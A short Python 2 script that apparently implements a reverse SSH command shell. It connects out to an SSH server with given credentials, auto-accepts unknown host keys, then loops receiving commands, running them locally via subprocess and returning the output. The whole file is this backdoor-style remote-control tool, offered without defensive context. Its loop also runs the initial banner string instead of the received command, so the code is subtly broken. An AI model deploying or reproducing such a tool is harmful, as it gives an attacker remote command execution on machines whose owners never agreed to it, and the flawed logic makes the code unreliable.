#!/usr/bin/env python

import sys
import paramiko
import subprocess

def ssh_command(ip, user, pwd, cmd):

	client = paramiko.SSHClient()
	#client.load_host_keys('/root/.ssh/known_hosts')
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# Connect
	client.connect(ip, username=user, password=pwd)
	ssh_session = client.get_transport().open_session()

	if ssh_session.active:
		ssh_session.send(cmd)

		# recv the banner
		print(ssh_session.recv(1024))

		while True:
			# Get the cmd from the SSH server
			command = ssh_session.recv(1024)

			try:
				cmd_output = subprocess.check_output(cmd)
				ssh_session.send(cmd_output)

			except Exception, e:
				ssh_session.send(str(e))

		client.close()

	return

ssh_command('127.0.0.1', 'user', '', 'ClientConnected')